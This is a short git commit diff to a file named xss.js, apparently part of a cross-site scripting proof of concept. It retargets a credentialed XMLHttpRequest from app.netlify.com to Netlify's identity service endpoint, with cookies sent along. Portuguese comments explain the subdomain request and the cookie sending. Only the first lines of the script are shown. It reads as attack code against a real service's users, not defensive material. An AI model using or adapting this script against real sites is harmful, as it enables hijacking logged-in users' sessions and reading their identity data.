cd68d7ad9ee0d8969382ede16cf2394bcf09ec76
CebolaJonas <105110332+CebolaJonas@users.noreply.github.com>
2025-04-24 21:54:49 -0400

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://app.netlify.com", true);  // Fazendo a requisição para o subdomínio
+xhr.open("GET", "https://identity.services.netlify.com/", true);  // Fazendo a requisição para o subdomínio
 xhr.withCredentials = true;  // Envia cookies com a requisição CORS
 
 xhr.onreadystatechange = function() {
